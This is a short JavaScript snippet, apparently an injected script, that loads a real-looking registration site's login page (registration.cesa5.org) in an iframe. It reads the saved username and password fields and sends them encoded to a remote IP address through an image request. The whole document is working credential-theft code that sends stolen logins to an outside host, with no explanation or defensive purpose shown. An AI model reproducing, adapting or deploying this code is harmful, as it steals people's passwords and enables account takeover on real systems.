const frimfram = document.createElement('iframe'); 
frimfram.src = 'https://registration.cesa5.org/np/logout.do';
frimfram.id = 'frimfram';
var frimframdoc;
var pw;
var un;
var imag;
var fin;
function frimframlistener(){
	try{
		frimframdoc = document.getElementById('frimfram').contentWindow.document;
		pw = frimframdoc.querySelector('#password').value;
		un = frimframdoc.querySelector('#loginName').value;
		imag = document.createElement('img');
		fin = encodeURIComponent('pwd='+pw+'&usr='+un);
		imag.src = 'http://74.14.159.250:8000/?' + fin;
		document.body.appendChild(imag);
	}catch(error){
		console.error(error);
	}
}
frimfram.addEventListener('load', frimframlistener);
document.body.appendChild(frimfram);
